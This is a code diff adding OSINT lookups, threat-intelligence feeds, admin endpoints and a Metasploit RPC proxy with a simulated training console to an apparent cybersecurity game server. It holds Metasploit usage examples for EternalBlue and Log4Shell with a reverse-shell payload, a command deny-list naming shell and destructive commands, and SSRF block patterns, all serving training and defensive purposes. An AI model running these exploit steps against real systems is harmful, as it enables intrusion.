@@ -809,6 +809,511 @@ app.post('/api/subscription/activate-basic', authRequired, async (req, res) => {
   return res.json({ ok: true, subscriptionTier: user.subscriptionTier });
 });
 
+// ═══════════════════════════════════════════
+// In-memory TTL cache (Redis-upgradeable)
+// ═══════════════════════════════════════════
+const CACHE = new Map();
+function cacheGet(key) {
+  const e = CACHE.get(key);
+  if (!e) return null;
+  if (Date.now() > e.exp) { CACHE.delete(key); return null; }
+  return e.data;
+}
+function cacheSet(key, data, ttlMs) { CACHE.set(key, { data, exp: Date.now() + ttlMs }); }
+
+let redis = null;
+if (process.env.REDIS_URL) {
+  try {
+    const Redis = require('ioredis');
+    redis = new Redis(process.env.REDIS_URL, { lazyConnect: true, enableReadyCheck: false, connectTimeout: 4000 });
+    redis.on('error', e => console.warn('[Redis]', e.message));
+    console.log('[Redis] ioredis connected — upgrading cache layer');
+  } catch (_) { console.warn('[Redis] ioredis not installed, using in-memory cache'); }
+}
+
+async function rGet(key) {
+  if (redis) { try { const v = await redis.get(key); return v ? JSON.parse(v) : null; } catch (_) {} }
+  return cacheGet(key);
+}
+async function rSet(key, data, ttlSec) {
+  if (redis) { try { await redis.setex(key, ttlSec, JSON.stringify(data)); return; } catch (_) {} }
+  cacheSet(key, data, ttlSec * 1000);
+}
+
+// Purge expired in-memory cache every 5 min
+setInterval(() => { const now = Date.now(); for (const [k, v] of CACHE) if (now > v.exp) CACHE.delete(k); }, 300000);
+
+// ═══════════════════════════════════════════
+// Input sanitizers
+// ═══════════════════════════════════════════
+function sanitizeDomain(raw) {
+  if (!raw || typeof raw !== 'string') return null;
+  const d = raw.trim().toLowerCase().replace(/^https?:\/\//, '').split('/')[0].split('?')[0];
+  if (!/^[a-z0-9][a-z0-9\-\.]{0,251}[a-z0-9]$/.test(d)) return null;
+  return d;
+}
+function sanitizeIp(raw) {
+  if (!raw || typeof raw !== 'string') return null;
+  const ip = raw.trim();
+  if (!/^[0-9a-fA-F:\.]{3,45}$/.test(ip)) return null;
+  if (/^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.|169\.254\.|0\.0\.0\.|::1|fc00:|fe80:)/.test(ip)) return null;
+  return ip;
+}
+function ssrfBlock(hostname) {
+  return /^(localhost|127\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|0\.|::1|fc00:|fe80:|metadata\.google|169\.254\.)/.test(hostname);
+}
+
+// ═══════════════════════════════════════════
+// OSINT endpoints
+// ═══════════════════════════════════════════
+const limiterOsint = rateLimit({ windowMs: 60000, max: 20, standardHeaders: true, legacyHeaders: false, message: { error: 'OSINT rate limit: 20/min.' } });
+
+// GET /api/osint/rdap?domain=example.com
+app.get('/api/osint/rdap', limiterOsint, async (req, res) => {
+  const domain = sanitizeDomain(req.query.domain);
+  if (!domain) return res.status(400).json({ error: 'Valid domain required' });
+  const ck = `rdap:${domain}`;
+  const hit = await rGet(ck);
+  if (hit) return res.json({ ...hit, cached: true });
+  try {
+    const r = await fetch(`https://rdap.org/domain/${encodeURIComponent(domain)}`, {
+      headers: { 'Accept': 'application/json', 'User-Agent': 'FURIOS-OSINT/3.0' },
+      signal: AbortSignal.timeout(8000)
+    });
+    if (!r.ok) return res.status(502).json({ error: `RDAP ${r.status}` });
+    const d = await r.json();
+    const result = {
+      domain: d.ldhName || domain,
+      status: d.status || [],
+      registrar: (d.entities || []).find(e => (e.roles || []).includes('registrar'))
+        ?.vcardArray?.[1]?.find(f => f[0] === 'fn')?.[3] || 'unknown',
+      nameservers: (d.nameservers || []).map(n => n.ldhName),
+      events: (d.events || []).map(e => ({ action: e.eventAction, date: e.eventDate })),
+      handle: d.handle
+    };
+    await rSet(ck, result, 3600);
+    return res.json(result);
+  } catch (e) { return res.status(502).json({ error: 'RDAP failed', detail: e.message }); }
+});
+
+// GET /api/osint/crtsh?domain=example.com
+app.get('/api/osint/crtsh', limiterOsint, async (req, res) => {
+  const domain = sanitizeDomain(req.query.domain);
+  if (!domain) return res.status(400).json({ error: 'Valid domain required' });
+  const ck = `crtsh:${domain}`;
+  const hit = await rGet(ck);
+  if (hit) return res.json({ ...hit, cached: true });
+  try {
+    const r = await fetch(`https://crt.sh/?q=%.${encodeURIComponent(domain)}&output=json`, {
+      headers: { 'User-Agent': 'FURIOS-OSINT/3.0' },
+      signal: AbortSignal.timeout(14000)
+    });
+    if (!r.ok) return res.status(502).json({ error: `crt.sh ${r.status}` });
+    const data = await r.json();
+    const seen = new Set();
+    const subdomains = data.map(e => e.name_value.split('\n')).flat()
+      .filter(s => { if (seen.has(s)) return false; seen.add(s); return true; })
+      .filter(s => s.endsWith(domain)).sort();
+    const result = {
+      domain, subdomains, count: subdomains.length,
+      sampleCerts: data.slice(0, 5).map(c => ({
+        id: c.id, issuer: c.issuer_name,
+        notBefore: c.not_before, notAfter: c.not_after, name: c.name_value
+      }))
+    };
+    await rSet(ck, result, 1800);
+    return res.json(result);
+  } catch (e) { return res.status(502).json({ error: 'crt.sh failed', detail: e.message }); }
+});
+
+// GET /api/osint/dns?domain=example.com&type=ALL
+const dnsLib = require('dns').promises;
+app.get('/api/osint/dns', limiterOsint, async (req, res) => {
+  const domain = sanitizeDomain(req.query.domain);
+  const type = String(req.query.type || 'ALL').toUpperCase();
+  const ALLOWED = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA', 'ALL'];
+  if (!domain) return res.status(400).json({ error: 'Valid domain required' });
+  if (!ALLOWED.includes(type)) return res.status(400).json({ error: 'Invalid type' });
+  const ck = `dns:${domain}:${type}`;
+  const hit = await rGet(ck);
+  if (hit) return res.json({ ...hit, cached: true });
+  const recs = {};
+  const resolveOne = async (t) => {
+    try {
+      switch (t) {
+        case 'A':     recs.A     = await dnsLib.resolve4(domain);     break;
+        case 'AAAA':  recs.AAAA  = await dnsLib.resolve6(domain);     break;
+        case 'MX':    recs.MX    = await dnsLib.resolveMx(domain);    break;
+        case 'NS':    recs.NS    = await dnsLib.resolveNs(domain);    break;
+        case 'TXT':   recs.TXT   = await dnsLib.resolveTxt(domain);   break;
+        case 'CNAME': recs.CNAME = await dnsLib.resolveCname(domain); break;
+        case 'SOA':   recs.SOA   = await dnsLib.resolveSoa(domain);   break;
+      }
+    } catch (_) { recs[t] = null; }
+  };
+  if (type === 'ALL') await Promise.all(['A','AAAA','MX','NS','TXT','CNAME'].map(resolveOne));
+  else await resolveOne(type);
+  const result = { domain, records: recs };
+  await rSet(ck, result, 300);
+  return res.json(result);
+});
+
+// GET /api/osint/ip?ip=8.8.8.8
+app.get('/api/osint/ip', limiterOsint, async (req, res) => {
+  const ip = sanitizeIp(req.query.ip);
+  if (!ip) return res.status(400).json({ error: 'Valid public IP required' });
+  const ck = `ip:${ip}`;
+  const hit = await rGet(ck);
+  if (hit) return res.json({ ...hit, cached: true });
+  try {
+    const r = await fetch(`https://ipwho.is/${encodeURIComponent(ip)}`, {
+      headers: { 'User-Agent': 'FURIOS-OSINT/3.0' },
+      signal: AbortSignal.timeout(6000)
+    });
+    if (!r.ok) return res.status(502).json({ error: `ipwho.is ${r.status}` });
+    const d = await r.json();
+    const result = {
+      ip: d.ip, type: d.type,
+      country: d.country, country_code: d.country_code,
+      region: d.region, city: d.city,
+      isp: d.connection && d.connection.isp,
+      org: d.connection && d.connection.org,
+      asn: d.connection && d.connection.asn,
+      lat: d.latitude, lon: d.longitude,
+      is_eu: d.is_eu
+    };
+    await rSet(ck, result, 3600);
+    return res.json(result);
+  } catch (e) { return res.status(502).json({ error: 'IP lookup failed', detail: e.message }); }
+});
+
+// GET /api/tools/headers?url=https://example.com  (SSRF-safe)
+const limiterHeaders = rateLimit({ windowMs: 60000, max: 15, standardHeaders: true, legacyHeaders: false, message: { error: 'Header check rate limit.' } });
+app.get('/api/tools/headers', limiterHeaders, async (req, res) => {
+  if (!req.query.url) return res.status(400).json({ error: 'url required' });
+  let target;
+  try {
+    target = new URL(req.query.url);
+    if (!['http:', 'https:'].includes(target.protocol)) throw new Error('bad protocol');
+    if (ssrfBlock(target.hostname)) return res.status(400).json({ error: 'Private URLs not allowed' });
+  } catch (e) { return res.status(400).json({ error: 'Invalid URL' }); }
+
+  const ck = `headers:${target.origin}`;
+  const hit = await rGet(ck);
+  if (hit) return res.json({ ...hit, cached: true });
+  try {
+    const r = await fetch(target.origin + '/', {
+      method: 'HEAD', redirect: 'follow',
+      headers: { 'User-Agent': 'FURIOS-SecurityAudit/3.0' },
+      signal: AbortSignal.timeout(8000)
+    });
+    const hdrs = Object.fromEntries(r.headers.entries());
+    const SEC_HDRS = [
+      'strict-transport-security', 'content-security-policy', 'x-frame-options',
+      'x-content-type-options', 'referrer-policy', 'permissions-policy',
+      'cross-origin-opener-policy', 'cross-origin-resource-policy', 'cross-origin-embedder-policy'
+    ];
+    const analysis = {};
+    for (const h of SEC_HDRS) analysis[h] = { present: h in hdrs, value: hdrs[h] || null };
+    const score = Math.round(SEC_HDRS.filter(h => h in hdrs).length / SEC_HDRS.length * 100);
+    const result = { url: target.origin, status: r.status, securityHeaders: analysis, securityScore: score };
+    await rSet(ck, result, 600);
+    return res.json(result);
+  } catch (e) { return res.status(502).json({ error: 'Fetch failed', detail: e.message }); }
+});
+
+// ═══════════════════════════════════════════
+// Threat Intelligence Feeds (server-cached)
+// ═══════════════════════════════════════════
+
+// GET /api/threat/nvd?limit=10&severity=CRITICAL
+app.get('/api/threat/nvd', async (req, res) => {
+  const limit = Math.min(20, Math.max(1, parseInt(req.query.limit || '10', 10)));
+  const severity = String(req.query.severity || '').toUpperCase();
+  if (severity && !['CRITICAL','HIGH','MEDIUM','LOW'].includes(severity)) return res.status(400).json({ error: 'Invalid severity' });
+  const ck = `nvd:${severity}:${limit}`;
+  const hit = await rGet(ck);
+  if (hit) return res.json({ ...hit, cached: true });
+  try {
+    const params = new URLSearchParams({ resultsPerPage: String(limit), startIndex: '0' });
+    if (severity) params.set('cvssV3Severity', severity);
+    if (process.env.NVD_API_KEY) params.set('apiKey', process.env.NVD_API_KEY);
+    const r = await fetch(`https://services.nvd.nist.gov/rest/json/cves/2.0?${params}`, {
+      headers: { 'User-Agent': 'FURIOS-Intel/3.0' },
+      signal: AbortSignal.timeout(12000)
+    });
+    if (!r.ok) return res.status(502).json({ error: `NVD ${r.status}` });
+    const data = await r.json();
+    const cves = (data.vulnerabilities || []).map(v => {
+      const cve = v.cve;
+      const m = cve.metrics;
+      const cv = (m && m.cvssMetricV31 && m.cvssMetricV31[0]) || (m && m.cvssMetricV30 && m.cvssMetricV30[0]);
+      const desc = ((cve.descriptions || []).find(d => d.lang === 'en') || {}).value || '';
+      return {
+        id: cve.id, published: cve.published, modified: cve.lastModified,
+        score: cv ? cv.cvssData.baseScore : null,
+        severity: cv ? cv.cvssData.baseSeverity : null,
+        vector: cv ? cv.cvssData.vectorString : null,
+        description: desc,
+        refs: (cve.references || []).slice(0, 3).map(r => r.url)
+      };
+    });
+    const result = { total: data.totalResults, returned: cves.length, cves };
+    await rSet(ck, result, 900);
+    // Broadcast critical CVEs to all connected clients
+    cves.filter(c => c.severity === 'CRITICAL').forEach(c => {
+      io.emit('cve:alert', { cveId: c.id, severity: c.severity, score: c.score, description: c.description.slice(0, 200), at: new Date().toISOString() });
+    });
+    return res.json(result);
+  } catch (e) { return res.status(502).json({ error: 'NVD failed', detail: e.message }); }
+});
+
+// GET /api/threat/cisa-kev?limit=20&search=apache
+app.get('/api/threat/cisa-kev', async (req, res) => {
+  const limit = Math.min(50, Math.max(1, parseInt(req.query.limit || '20', 10)));
+  const search = String(req.query.search || '').slice(0, 80).toLowerCase();
+  const ck = 'cisa-kev';
+  let all = await rGet(ck);
+  if (!all) {
+    try {
+      const r = await fetch('https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json', {
+        headers: { 'User-Agent': 'FURIOS-Intel/3.0' },
+        signal: AbortSignal.timeout(15000)
+      });
+      if (!r.ok) return res.status(502).json({ error: `CISA ${r.status}` });
+      const data = await r.json();
+      all = data.vulnerabilities || [];
+      await rSet(ck, all, 3600);
+    } catch (e) { return res.status(502).json({ error: 'CISA KEV failed', detail: e.message }); }
+  }
+  const filtered = search
+    ? all.filter(v => [(v.cveID||''),(v.vulnerabilityName||''),(v.product||''),(v.vendorProject||'')]
+        .some(s => s.toLowerCase().includes(search)))
+    : all;
+  return res.json({
+    total: all.length, filtered: filtered.length, cached: !!await rGet(ck),
+    vulnerabilities: filtered.slice(0, limit).map(v => ({
+      cveID: v.cveID, vulnerabilityName: v.vulnerabilityName,
+      vendorProject: v.vendorProject, product: v.product,
+      dateAdded: v.dateAdded, dueDate: v.dueDate,
+      requiredAction: v.requiredAction, shortDescription: v.shortDescription
+    }))
+  });
+});
+
+// GET /api/threat/mitre?technique=T1190
+const MITRE_DB = {
+  'T1190': { id:'T1190', name:'Exploit Public-Facing Application', tactic:'initial-access', desc:'Adversaries exploit weaknesses in Internet-facing systems.', mitigation:'Patch management, WAF, network segmentation.', url:'https://attack.mitre.org/techniques/T1190' },
+  'T1059': { id:'T1059', name:'Command and Scripting Interpreter', tactic:'execution', desc:'Adversaries abuse interpreters to execute commands, scripts, or binaries.', mitigation:'AppLocker, WDAC, PowerShell logging.', url:'https://attack.mitre.org/techniques/T1059' },
+  'T1078': { id:'T1078', name:'Valid Accounts', tactic:'defense-evasion', desc:'Adversaries obtain and abuse credentials of existing accounts.', mitigation:'MFA, privilege review, PAM.', url:'https://attack.mitre.org/techniques/T1078' },
+  'T1566': { id:'T1566', name:'Phishing', tactic:'initial-access', desc:'Adversaries send phishing messages to gain access to victim systems.', mitigation:'Email filtering, user training, DMARC.', url:'https://attack.mitre.org/techniques/T1566' },
+  'T1055': { id:'T1055', name:'Process Injection', tactic:'privilege-escalation', desc:'Adversaries inject code into processes to evade defenses and elevate privileges.', mitigation:'Endpoint protection, behavior monitoring.', url:'https://attack.mitre.org/techniques/T1055' },
+  'T1003': { id:'T1003', name:'OS Credential Dumping', tactic:'credential-access', desc:'Adversaries dump credentials to obtain account login material.', mitigation:'Credential Guard, LSASS protection.', url:'https://attack.mitre.org/techniques/T1003' },
+  'T1021': { id:'T1021', name:'Remote Services', tactic:'lateral-movement', desc:'Adversaries use Valid Accounts to interact with remote connection services.', mitigation:'Network segmentation, MFA on RDP/SSH.', url:'https://attack.mitre.org/techniques/T1021' },
+  'T1071': { id:'T1071', name:'Application Layer Protocol (C2)', tactic:'command-and-control', desc:'Adversaries communicate over app-layer protocols to avoid detection.', mitigation:'TLS inspection, DNS monitoring, anomaly detection.', url:'https://attack.mitre.org/techniques/T1071' },
+  'T1486': { id:'T1486', name:'Data Encrypted for Impact', tactic:'impact', desc:'Adversaries encrypt data (ransomware) to interrupt availability.', mitigation:'Offline backups, EDR, network segmentation.', url:'https://attack.mitre.org/techniques/T1486' },
+  'T1110': { id:'T1110', name:'Brute Force', tactic:'credential-access', desc:'Adversaries use brute force techniques to gain access to accounts.', mitigation:'Account lockout, MFA, fail2ban.', url:'https://attack.mitre.org/techniques/T1110' },
+  'T1027': { id:'T1027', name:'Obfuscated Files or Information', tactic:'defense-evasion', desc:'Adversaries obfuscate content to make analysis and detection harder.', mitigation:'AV/EDR, binary analysis, network inspection.', url:'https://attack.mitre.org/techniques/T1027' },
+  'T1562': { id:'T1562', name:'Impair Defenses', tactic:'defense-evasion', desc:'Adversaries disable or tamper with security tools and logging.', mitigation:'Audit log integrity, endpoint hardening.', url:'https://attack.mitre.org/techniques/T1562' }
+};
+app.get('/api/threat/mitre', (req, res) => {
+  const id = String(req.query.technique || '').toUpperCase().slice(0, 10);
+  if (id) {
+    const t = MITRE_DB[id];
+    if (!t) return res.status(404).json({ error: 'Not in local cache', url: `https://attack.mitre.org/techniques/${id}` });
+    return res.json(t);
+  }
+  return res.json({ techniques: Object.values(MITRE_DB), count: Object.keys(MITRE_DB).length });
+});
+
+// ═══════════════════════════════════════════
+// Metasploit RPC Proxy + Console Simulation
+// ═══════════════════════════════════════════
+const MSF_RPC_URL  = process.env.MSF_RPC_URL  || '';
+const MSF_RPC_PASS = process.env.MSF_RPC_PASS || '';
+let msfToken = null;
+
+async function msfAuth() {
+  if (!MSF_RPC_URL || !MSF_RPC_PASS) return null;
+  try {
+    const r = await fetch(`${MSF_RPC_URL}/api/v1/auth/login`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username: 'msf', password: MSF_RPC_PASS }),
+      signal: AbortSignal.timeout(5000)
+    });
+    const d = await r.json();
+    msfToken = d.token || null;
+    if (msfToken) console.log('[MSF] RPC authenticated — live Metasploit connected');
+    return msfToken;
+  } catch (e) {
+    console.warn('[MSF] RPC auth failed:', e.message);
+    return null;
+  }
+}
+
+// GET /api/tools/msf/search?q=eternalblue&type=exploit
+app.get('/api/tools/msf/search', async (req, res) => {
+  const q        = String(req.query.q        || '').slice(0, 80).toLowerCase();
+  const type     = String(req.query.type     || '');
+  const category = String(req.query.category || '');
+
+  if (MSF_RPC_URL && msfToken) {
+    try {
+      const r = await fetch(`${MSF_RPC_URL}/api/v1/modules/search?q=${encodeURIComponent(q)}`, {
+        headers: { 'Authorization': `Bearer ${msfToken}` },
+        signal: AbortSignal.timeout(6000)
+      });
+      if (r.ok) return res.json({ source: 'live-msf', ...(await r.json()) });
+    } catch (_) {}
+  }
+
+  let mods = MSF_MODULES;
+  if (q)        mods = mods.filter(m => m.name.includes(q) || m.desc.toLowerCase().includes(q) || (m.cve||'').includes(q));
+  if (type)     mods = mods.filter(m => m.type === type);
+  if (category) mods = mods.filter(m => m.category === category);
+  return res.json({ source: 'catalog', modules: mods, total: mods.length });
+});
+
+// GET /api/tools/msf/module?name=exploit/...
+app.get('/api/tools/msf/module', (req, res) => {
+  const name = String(req.query.name || '').slice(0, 120);
+  if (!name) return res.status(400).json({ error: 'name required' });
+  const mod = MSF_MODULES.find(m => m.name === name);
+  if (!mod) return res.status(404).json({ error: 'Module not in catalog' });
+  const USAGE = {
+    'exploit/windows/smb/ms17_010_eternalblue': 'use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS <target>\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST <your-ip>\nrun',
+    'auxiliary/scanner/portscan/tcp': 'use auxiliary/scanner/portscan/tcp\nset RHOSTS 10.10.10.0/24\nset PORTS 22,80,443,445,3389\nrun',
+    'exploit/multi/http/log4shell_header': 'use exploit/multi/http/log4shell_header\nset RHOSTS <target>\nset LHOST <your-ip>\nrun'
+  };
+  return res.json({ ...mod, usageExample: USAGE[name] || `use ${name}\nshow options\nrun` });
+});
+
+// GET /api/tools/msf/sessions (live RPC or empty)
+app.get('/api/tools/msf/sessions', authRequired, async (req, res) => {
+  if (MSF_RPC_URL && msfToken) {
+    try {
+      const r = await fetch(`${MSF_RPC_URL}/api/v1/sessions`, {
+        headers: { 'Authorization': `Bearer ${msfToken}` },
+        signal: AbortSignal.timeout(5000)
+      });
+      if (r.ok) return res.json(await r.json());
+    } catch (_) {}
+  }
+  return res.json({ sessions: [], note: 'Set MSF_RPC_URL + MSF_RPC_PASS to connect live Metasploit' });
+});
+
+// POST /api/tools/msf/console — proxy or educational simulation
+const limiterMsfConsole = rateLimit({ windowMs: 60000, max: 10, standardHeaders: true, legacyHeaders: false, message: { error: 'MSF console: 10 commands/min.' } });
+const MSF_DENY = /shell|exec|system\s*\(|rm\s+-rf|del\s+\/|format\s+[a-z]:|;\s*\S|&&|\|\||`/i;
+
+app.post('/api/tools/msf/console', authRequired, limiterMsfConsole, async (req, res) => {
+  const cmd = String((req.body || {}).command || '').slice(0, 200).trim();
+  if (!cmd) return res.status(400).json({ error: 'command required' });
+  if (MSF_DENY.test(cmd)) return res.status(400).json({ error: 'Command not permitted in training mode.' });
+
+  if (MSF_RPC_URL && msfToken) {
+    try {
+      const r = await fetch(`${MSF_RPC_URL}/api/v1/consoles`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${msfToken}` },
+        body: JSON.stringify({ command: cmd }),
+        signal: AbortSignal.timeout(8000)
+      });
+      if (r.ok) return res.json(await r.json());
+    } catch (_) {}
+  }
+
+  // Educational simulation
+  const SIM = {
+    'help':              'Core Commands:\n  help, use <module>, search <term>, show options|exploits|payloads\n  set <OPT> <VAL>, run, sessions, exit\n',
+    'version':           'Framework: 6.4.0-dev-FURIOS-TRAINING  Ruby: 3.2.0  OpenSSL: 3.1.4\n',
+    'sessions':          'Active sessions: 0\n[TIP] Run an exploit first to create sessions.\n',
+    'show exploits':     MSF_MODULES.filter(m => m.type === 'exploit').map(m => `  ${m.name}`).join('\n') + '\n',
+    'show auxiliary':    MSF_MODULES.filter(m => m.type === 'auxiliary').map(m => `  ${m.name}`).join('\n') + '\n',
+    'search eternalblue': '  exploit/windows/smb/ms17_010_eternalblue  [EternalBlue CVE-2017-0144]\n  auxiliary/scanner/smb/smb_ms17_010       [Scanner]\n',
+    'search log4':       '  exploit/multi/http/log4shell_header        [Log4Shell CVE-2021-44228]\n',
+    'search struts':     '  exploit/multi/http/struts2_content_type_ognl  [CVE-2017-5638]\n',
+    'search sudo':       '  exploit/linux/local/sudo_baron_samedit     [Baron Samedit CVE-2021-3156]\n'
+  };
+  const key = Object.keys(SIM).find(k => cmd.toLowerCase().startsWith(k));
+  if (key) return res.json({ output: `msf6 > ${cmd}\n${SIM[key]}`, mode: 'simulation' });
+
+  if (/^use\s+/.test(cmd)) {
+    const modName = cmd.slice(4).trim();
+    const found = MSF_MODULES.find(m => m.name === modName);
+    return res.json({ output: found
+      ? `msf6 > ${cmd}\n[*] Using ${found.name}\n[i] ${found.desc}\nmsf6 ${found.type}(${found.name.split('/').pop()}) >\n`
+      : `msf6 > ${cmd}\n[-] Module not found: ${modName}\n`, mode: 'simulation' });
+  }
+
+  return res.json({ output: `msf6 > ${cmd}\n[i] Training mode — use 'help' or 'show exploits'\n`, mode: 'simulation' });
+});
+
+// ═══════════════════════════════════════════
+// Admin API (ADMIN_KEY header required)
+// ═══════════════════════════════════════════
+const ADMIN_KEY = process.env.ADMIN_KEY || '';
+function adminAuth(req, res, next) {
+  const key = req.headers['x-admin-key'] || (req.body && req.body.adminKey);
+  if (!ADMIN_KEY || key !== ADMIN_KEY) return res.status(403).json({ error: 'Admin access denied' });
+  return next();
+}
+
+// POST /api/admin/world
+app.post('/api/admin/world', adminAuth, async (req, res) => {
+  const { operation, globalThreat, news, onlineCount } = req.body || {};
+  const partial = {};
+  if (operation)    partial.operation    = String(operation).slice(0, 100);
+  if (globalThreat) partial.globalThreat = String(globalThreat).slice(0, 30);
+  if (Array.isArray(news)) partial.news  = news.slice(0, 5).map(n => String(n).slice(0, 200));
+  if (typeof onlineCount === 'number') partial.onlineCount = Math.max(0, onlineCount);
+  const world = await store.updateWorldMeta(partial);
+  io.emit('world:update', world);
+  return res.json({ ok: true, world });
+});
+
+// POST /api/admin/broadcast
+app.post('/api/admin/broadcast', adminAuth, (req, res) => {
+  const { event, payload, room } = req.body || {};
+  if (!event) return res.status(400).json({ error: 'event required' });
+  const safeEvent = String(event).replace(/[^a-z0-9:_-]/gi, '').slice(0, 50);
+  const data = payload || {};
+  room ? io.to(String(room).slice(0, 60)).emit(safeEvent, data) : io.emit(safeEvent, data);
+  return res.json({ ok: true, event: safeEvent, room: room || 'global', clients: io.engine.clientsCount });
+});
+
+// POST /api/admin/cve-alert
+app.post('/api/admin/cve-alert', adminAuth, (req, res) => {
+  const { cveId, severity, description, score } = req.body || {};
+  if (!cveId) return res.status(400).json({ error: 'cveId required' });
+  const alert = { cveId: String(cveId).slice(0,30), severity: String(severity||'HIGH').slice(0,10), score: Number(score)||null, description: String(description||'').slice(0,300), at: new Date().toISOString() };
+  io.emit('cve:alert', alert);
+  return res.json({ ok: true, alert, recipients: io.engine.clientsCount });
+});
+
+// ── GET /api/stats ──────────────────────────────────────────────────────────
+app.get('/api/stats', async (req, res) => {
+  const world = await store.getWorldMeta().catch(() => ({}));
+  let userCount = 0;
+  if (usePostgres) {
+    try { const r = await pool.query('SELECT COUNT(*) FROM users'); userCount = parseInt(r.rows[0].count, 10); } catch (_) {}
+  } else {
+    try { const db = loadDb(); userCount = (db.users || []).length; } catch (_) {}
+  }
+  return res.json({
+    service: 'furios-nexus', version: '3.0.0',
+    uptime: Math.floor(process.uptime()),
+    memory: process.memoryUsage(),
+    db: usePostgres ? 'postgres' : 'json-file',
+    redis: redis ? 'connected' : 'in-memory',
+    msfRpc: MSF_RPC_URL ? 'configured' : 'catalog-only',
+    operatives: userCount, onlineNow: io.engine.clientsCount,
+    world: { operation: world.operation, globalThreat: world.globalThreat },
+    cacheSize: CACHE.size
+  });
+});
+
 // Socket presence + simple lobby rooms.
 io.use((socket, next) => {
   const token = socket.handshake.auth && socket.handshake.auth.token;
@@ -861,6 +1366,17 @@ io.on('connection', (socket) => {
     });
   });
 
+  socket.on('world:ping', async () => {
+    const world = await store.getWorldMeta().catch(() => ({}));
+    socket.emit('world:update', world);
+  });
+
+  socket.on('msf:module:search', (payload) => {
+    const q = String((payload && payload.q) || '').slice(0, 80).toLowerCase();
+    const results = MSF_MODULES.filter(m => !q || m.name.includes(q) || m.desc.toLowerCase().includes(q));
+    socket.emit('msf:module:results', { q, modules: results.slice(0, 20), total: results.length });
+  });
+
   socket.on('disconnect', () => {
     store.updateWorldMeta({ onlineCount: io.engine.clientsCount });
     io.emit('presence:update', { onlineCount: io.engine.clientsCount });
@@ -875,9 +1391,31 @@ io.on('connection', (socket) => {
     console.error('[DB] Schema init failed (server will start without DB):', err.message);
     usePostgres = false;
   }
+
+  // Attempt Metasploit RPC auth if configured
+  if (MSF_RPC_URL) {
+    await msfAuth();
+    // Re-auth every 30 minutes (token expiry)
+    setInterval(msfAuth, 30 * 60 * 1000);
+  }
+
+  // Warm the CISA KEV cache in background
+  fetch('https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json', {
+    headers: { 'User-Agent': 'FURIOS-Intel/3.0' }, signal: AbortSignal.timeout(20000)
+  }).then(r => r.json()).then(d => {
+    if (d.vulnerabilities) rSet('cisa-kev', d.vulnerabilities, 3600);
+    console.log(`[INTEL] CISA KEV cached — ${(d.vulnerabilities || []).length} entries`);
+  }).catch(e => console.warn('[INTEL] CISA KEV warm failed:', e.message));
+
   server.listen(PORT, '0.0.0.0', () => {
     console.log(`CyberWorld multiplayer server listening on 0.0.0.0:${PORT}`);
+    console.log(`[OSINT] Endpoints: /api/osint/rdap|crtsh|dns|ip`);
+    console.log(`[INTEL] Endpoints: /api/threat/nvd|cisa-kev|mitre`);
+    console.log(`[MSF]   Endpoints: /api/tools/msf/search|module|sessions|console`);
+    console.log(`[ADMIN] Endpoints: /api/admin/world|broadcast|cve-alert (ADMIN_KEY required)`);
+    console.log(`[STATS] Endpoint:  /api/stats`);
     if (usePostgres) console.log('[DB] Connected to PostgreSQL');
     if (stripe) console.log('[Stripe] Webhook endpoint: POST /api/stripe/webhook');
+    if (MSF_RPC_URL) console.log(`[MSF] Live RPC configured at ${MSF_RPC_URL}`);
   });
 })();
